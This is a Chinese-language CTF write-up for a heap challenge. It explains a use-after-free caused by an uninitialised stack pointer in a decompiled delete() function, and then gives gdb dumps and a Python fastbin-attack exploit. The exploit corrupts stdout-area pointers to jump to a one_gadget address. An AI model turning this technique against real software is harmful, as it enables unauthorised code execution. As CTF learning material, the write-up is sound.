## 漏洞点

delete函数内指针变量未初始化，而且view函数与delete函数栈帧布局一样，造成use after free。

先调用view函数，栈中存储有note的指针，再调用delete函数，delete一个不存在的note，那么delete函数的ptr就会是view函数内的note指针，造成未预期free。

view函数:
```c
unsigned __int64 view()
{
  signed int i; // [rsp+4h] [rbp-1Ch]
  note *note__ptr; // [rsp+8h] [rbp-18h]
  char s1; // [rsp+10h] [rbp-10h]
  unsigned __int64 v4; // [rsp+18h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  note__ptr = 0LL;                        // 此处对指针初始化
  printf("please input note title: ");
  read_with_null((__int64)&s1, 8u);
  for ( i = 0; i <= 31; ++i )
  {
    if ( note__ptr_list[i] && !strncmp(&s1, (const char *)note__ptr_list[i], 8uLL) )
    {
      note__ptr = (note *)note__ptr_list[i];
      break;                      
    }
  }
  if ( note__ptr )
    printf("note title: %s\nnote content: %s\n", note__ptr, note__ptr->content_ptr);
  else
    puts("not a valid title");
  return __readfsqword(0x28u) ^ v4;
}
```

delete函数：
```c
unsigned __int64 delete()
{
  signed int i; // [rsp+4h] [rbp-1Ch]
  note *ptr; // [rsp+8h] [rbp-18h]
  char s1; // [rsp+10h] [rbp-10h]
  unsigned __int64 v4; // [rsp+18h] [rbp-8h]

  v4 = __readfsqword(0x28u);
                                        //对ptr缺少初始化
  printf("please input note title: ");
  read_with_null((__int64)&s1, 8u);
  for ( i = 0; i <= 31; ++i )
  {
    if ( note__ptr_list[i] && !strncmp(&s1, (const char *)note__ptr_list[i], 8uLL) )
    {
      ptr = (note *)note__ptr_list[i];
      break;                  
    }
  }
                //代码异常点，未找到相关的note没有直接return，而是接着运行。
  if ( ptr )
  {
    free((void *)ptr->content_ptr);
    free(ptr);
    note__ptr_list[i] = 0LL;   // 此时i是31
  }
  else
  {
    puts("not a valid title");
  }
  return __readfsqword(0x28u) ^ v4;
}
```

## 利用

fastbin attack 

又学到一个姿势：

使用fastbin attack攻击`stdout + 0x9d`

```sh
gdb-peda$ p &_IO_2_1_stdout_
$3 = (struct _IO_FILE_plus *) 0x7fa675e2e620 <_IO_2_1_stdout_>

gdb-peda$ x/20x 0x7fa675e2e620+0x9d
0x7fa675e2e6bd <_IO_2_1_stdout_+157>:	0xa675e2d7a0000000	0x000000000000007f
0x7fa675e2e6cd <_IO_2_1_stdout_+173>:	0x0000000000000000	0x0000000000000000

gdb-peda$ x/20x 0x7fa675e2e620+0x90
0x7fa675e2e6b0 <_IO_2_1_stdout_+144>:	0xffffffffffffffff	0x0000000000000000
0x7fa675e2e6c0 <_IO_2_1_stdout_+160>:	0x00007fa675e2d7a0	0x0000000000000000
0x7fa675e2e6d0 <_IO_2_1_stdout_+176>:	0x0000000000000000	0x0000000000000000
0x7fa675e2e6e0 <_IO_2_1_stdout_+192>:	0x00000000ffffffff	0x0000000000000000
0x7fa675e2e6f0 <_IO_2_1_stdout_+208>:	0x0000000000000000	0x00007fa675e2c6e0
0x7fa675e2e700 <stderr>:	0x00007fa675e2e540	0x00007fa675e2e620
0x7fa675e2e710 <stdin>:	0x00007fa675e2d8e0	0x00007fa675a89b70
```

具体利用：

```python
stdout = libc + l.symbols['_IO_2_1_stdout_']
stderr = libc + l.symbols['_IO_2_1_stderr_']
stdin = libc + l.symbols['_IO_2_1_stdin_']
oneshot = libc + 0x4526a
print hex(oneshot)

edit('\x00',p64(stdout + 0x9d))      // 修改已经free的fastbin chunk的fd为stdout+0x9d
payload = '\x00' * 0x2b + p64(stdout + 0xc0) + p64(stderr) + p64(stdout)
payload += p64(stdin) + p64(oneshot) * 3

add('AA',0x68,'A' * 0x68)
#gdb.attach(s,sc)
add('AA',0x68,payload)
```

来自[大佬博客](https://lyoungjoo.github.io/2018/05/21/RCTF-2018-Write-Up/)